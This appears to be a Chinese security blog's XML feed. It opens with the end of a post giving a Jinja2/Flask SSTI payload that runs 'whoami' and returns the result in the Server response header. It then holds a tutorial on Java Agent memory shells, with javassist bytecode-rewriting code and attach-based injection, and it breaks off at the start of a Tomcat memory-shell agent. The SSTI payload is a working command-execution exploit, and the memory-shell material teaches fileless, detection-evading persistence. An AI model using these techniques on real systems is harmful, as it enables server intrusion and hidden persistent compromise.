10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-stylus">code=&#123;&#123;<span class="selector-tag">g</span><span class="selector-class">.pop</span>.__globals__.__builtins__<span class="selector-class">.setattr</span>(<span class="selector-tag">g</span><span class="selector-class">.pop</span>.__globals__<span class="selector-class">.sys</span><span class="selector-class">.modules</span><span class="selector-class">.werkzeug</span><span class="selector-class">.serving</span><span class="selector-class">.WSGIRequestHandler</span>,<span class="string">&quot;server_version&quot;</span>,<span class="selector-tag">g</span><span class="selector-class">.pop</span>.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)<span class="selector-class">.popen</span>(<span class="string">&#x27;whoami&#x27;</span>)<span class="selector-class">.read</span>())&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728726062146-b81d7b6d-b0f2-4210-b05d-8bec63ae8680.png"></p><p><img src="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/1728726094317-83fd80fe-2fc6-49e1-8b6b-cc730442fb8f.png"></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MemoryShell Of Agent</title>
      <link href="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java Agent是Java虚拟机提供的一种机制，允许在程序运行时动态地修改或增强Java应用程序的行为，通常使用Java Instrumentation API实现，可以在Java应用程序启动时通过命令行参数或其他方式加载。</p><p>将Java Agent与内存马结合使用，可以实现一种比传统的内存马更难以检测和防御的攻击方式。攻击者可以编写一个Java Agent程序，利用Java Instrumentation API动态地修改Java应用程序的字节码，将恶意代码插入到应用程序中，并在应用程序运行时执行恶意代码。由于恶意代码直接在内存中执行，不会在磁盘上留下痕迹，因此很难被传统的防御机制检测和防御。</p><h2 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h2><p>Java Agent简单来说就是JVM提供的一种动态Hook字节码的技术，通过Instrumentation（Java Agent API），开发者能够以一种无侵入的方式，在JVM加载某个class之前修改其字节码的内容，同时也支持重加载已经被加载过的class。</p><p>Java Agent目前有两种使用方式：</p><ul><li>通过-javaagent参数指定agent，从而在JVM启动之前修改class内容（自JDK 1.5开始）</li><li>通过VirtualMachine#attach方法，将agent附加在启动后的JVM进程中，进而动态修改class内容（自JDK 1.6开始）</li></ul><p>两种方式分别需要实现premain和agentmain方法，而这些方法又有如下四种签名，其中带有Instrumentation inst参数的方法优先级更高，会优先被调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs)</span>;</span><br></pre></td></tr></table></figure><h3 id="启动时"><a href="#启动时" class="headerlink" title="启动时"></a>启动时</h3><h4 id="基础概述"><a href="#基础概述" class="headerlink" title="基础概述"></a>基础概述</h4><p>启动Java程序的时候，利用Java Agent需要添加-javaagent或-agentpath&#x2F;-agentlib（JVMTI的实现方式）参数，Java规定Java Agent程序必须要打包成jar格式并且需要利用MANIFEST.MF文件来配置Java Agent相关参数。同时，jar包中的MANIFEST.MF文件必须指定Premain-Class项，Premain-Class指定的那个类必须实现premain方法。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Agent-Class: com.example.AgentMemoryShell</span><br><span class="line">Premain-Class: com.example.AgentMemoryShell</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>premain方法会在执行main方法前调用，在运行main方法前会去加载-javaagent指定的jar包里面的Premain-Class类中的premain方法。</p><p>工作原理：使用addTransformer方法注册了一个自定义的Transformer类到Java Agent，当有新类被JVM加载时，JVM会自动回调调用自定义Transformer类中的transform方法，传入该类的transform信息（类名、类加载器、类字节码等），并且可以根据传入的类信息决定是否需要修改类字节码，Java Agent修改完字节码后会将新的类字节码返回给JVM，JVM验证类和相应的修改是否合法，当符合类加载要求时，JVM会加载修改后的类字节码。</p><p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713618829182-838aab21-7859-4114-8316-34534f5a9612.png" alt="image.png"></p><p>Instrumentation接口，提供用于监测运行在JVM中的Java API：</p><ul><li>addTransformer&#x2F;removeTransformer，添加或删除ClassFileTransformer</li><li>getAllLoadedClasses，获取所有JVM加载的类</li><li>redefineClasses，重新定义已经加载类的字节码</li><li>setNativeMethodPrefix，动态设置JNI前缀，可以实现Hook Native方法</li><li>retransformClasses，重新加载已经被JVM加载过的类的字节码</li></ul><p>ClassFileTransformer接口是一个转换类文件的代理接口，可以在获取到Instrumentation对象后通过addTransformer方法添加自定义类文件转换器。</p><p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713620377436-534821e2-d495-49b0-b154-f180abab1881.png" alt="image.png"></p><h4 id="测试示例"><a href="#测试示例" class="headerlink" title="测试示例"></a>测试示例</h4><ul><li>创建Test测试类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String output;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">(String output)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.output = output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Print</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Test Class, output is &quot;</span> + output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>(<span class="string">&quot;H3rmesk1r&quot;</span>);</span><br><span class="line">        System.out.println(JSON.toJSON(test));</span><br><span class="line">        System.out.println(test.Print());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>创建MySelfAgent类，重写premain方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySelfAgent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MySelfAgent start...&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">MySelfTransformer</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>创建MySelfTransformer类，重写transform方法，利用javassist对Test类进行修改</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySelfTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className.equals(<span class="string">&quot;Test&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                classPool.appendClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(loader));</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(classfileBuffer), <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 增加一个String类型的属性input</span></span><br><span class="line">                <span class="type">CtField</span> <span class="variable">ctField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(classPool.get(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;input&quot;</span>, ctClass);</span><br><span class="line">                <span class="comment">// 设置属性为private</span></span><br><span class="line">                ctField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">                <span class="comment">// 增加属性到类中, 并设置默认值</span></span><br><span class="line">                ctClass.addField(ctField, CtField.Initializer.constant(<span class="string">&quot;javaagent&quot;</span>));</span><br><span class="line">                <span class="comment">// 增加GET/SET方法</span></span><br><span class="line">                ctClass.addMethod(CtNewMethod.setter(<span class="string">&quot;setInput&quot;</span>, ctField));</span><br><span class="line">                ctClass.addMethod(CtNewMethod.getter(<span class="string">&quot;getInput&quot;</span>, ctField));</span><br><span class="line">                <span class="comment">// 重写Print方法</span></span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">toString</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;Print&quot;</span>);</span><br><span class="line">                toString.setBody(<span class="string">&quot;return \&quot;Test Class, input is \&quot; + input + \&quot;, output is \&quot; + output;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>配置MANIFEST.MF文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Premain-Class: javaagent.TestAgent</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:/Users/alphag0/Desktop/Code/Java/AgentMemoryShell/out/artifacts/AgentMemoryShell_jar/AgentMemoryShell.jar -jar /Users/alphag0/Desktop/Code/Java/Test/out/artifacts/Test_jar/Test.jar</span><br></pre></td></tr></table></figure><p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713674825207-ccef9d57-2fa2-440b-871a-7081af687b44.png" alt="image.png"></p><h3 id="运行时"><a href="#运行时" class="headerlink" title="运行时"></a>运行时</h3><h4 id="基础概述-1"><a href="#基础概述-1" class="headerlink" title="基础概述"></a>基础概述</h4><p>JDK1.6后，增加了agentmain方法，可以在main方法后执行，此时便可以在程序运行时，利用Agent技术来达成一些目的，运行时Agent技术主要依靠VirtualMachine类和VirtualMachineDescriptor类。</p><p>VirtualMachine类：</p><ul><li>attach，可以通过attach方法传入一个JVM的PID，远程连接到JVM上</li><li>loadAgent，向JVM注册一个代理程序Agent，在该Agent的代理程序中会得到一个Instrumentation实例，该实例可以在class加载前改变class的字节码，也可以在class加载后重新加载，在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理</li><li>detach，解出attach建立的连接</li></ul><p>VirtualMachineDescriptor类是用于描述Java虚拟机的容器类，它封装了一个标识目标虚拟机的标识符，以及一个AttachProvider在尝试连接到虚拟机时应该使用的引用。</p><p>VirtualMachineDescriptor实例通过调用VirtualMachine#list方法创建，返回描述所有已安装Java虚拟机的完整描述符列表attach providers。</p><p>工作原理：VirtualMachine类的attach方法，可以attach到一个运行中的java进程上，之后便可以通过loadAgent方法来将agent的jar包注入到对应的进程，注入后，对应进程会调用agentmain方法。</p><p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713678222311-396fbea3-3a28-40f4-8c03-7245d3551d0b.png" alt="image.png"></p><p>对于已加载的类，需要调用retransformClass函数，然后由redefineClasses函数读取已加载的字节码文件后重新加载指定类的字节码。</p><p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713749172778-13323227-71fd-4db3-8f87-d995c8569929.png" alt="image.png"></p><p>但是使用redefineClasses时存在一些限制：</p><ul><li>继承相同的父类</li><li>实现相同的接口</li><li>字段数和字段名要一致，不支持在重新加载时添加或者删除字段</li><li>新增或删除的方法必须是private static&#x2F;final修饰的</li><li>可以修改方法实现</li></ul><h4 id="测试示例-1"><a href="#测试示例-1" class="headerlink" title="测试示例"></a>测试示例</h4><ul><li>创建测试类Test</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;false&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkFlag</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="string">&quot;true&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (checkFlag()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;running true...&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;running false...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>创建Agent类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> vm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttachAgent</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;agentmain...&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">MyTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class loadedClass : allLoadedClasses) &#123;</span><br><span class="line">            <span class="keyword">if</span> (loadedClass.getName() == <span class="string">&quot;Test&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    inst.retransformClasses(loadedClass);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;running JVM...&quot;</span>);</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; virtualMachineDescriptorList = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor vmd : virtualMachineDescriptorList) &#123;</span><br><span class="line">            System.out.println(vmd.displayName());</span><br><span class="line">            <span class="keyword">if</span> (vmd.displayName().equals(<span class="string">&quot;Test&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/AgentMemoryShell/out/artifacts/AgentMemoryShell_jar/AgentMemoryShell.jar&quot;</span>);</span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className.equals(<span class="string">&quot;Test&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                classPool.appendClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(loader));</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(classfileBuffer), <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 由于要保持字段数不变, 无法增加新字段, 重写checkFlag方法</span></span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">checkFlag</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;checkFlag&quot;</span>);</span><br><span class="line">                checkFlag.setBody(<span class="string">&quot;&#123;System.out.println(\&quot;Attach successfully...\&quot;);return true;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>配置MANIFEST.MF文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Agent-Class: vm.AttachAgent</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713750379102-886c7ab5-3604-456f-86ca-3218aef5231c.png" alt="image.png"></p><h2 id="Java-Agent内存马"><a href="#Java-Agent内存马" class="headerlink" title="Java Agent内存马"></a>Java Agent内存马</h2><p>根据Java Agent的实现原理，Agent内存马实现的思路就是找一个比较通用的类，保证每一次request请求都能调用到它的某一个方法, 然后利用javaassist插入恶意Java代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatAgent</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Agentmain...&quot;</span>);</span><br><span 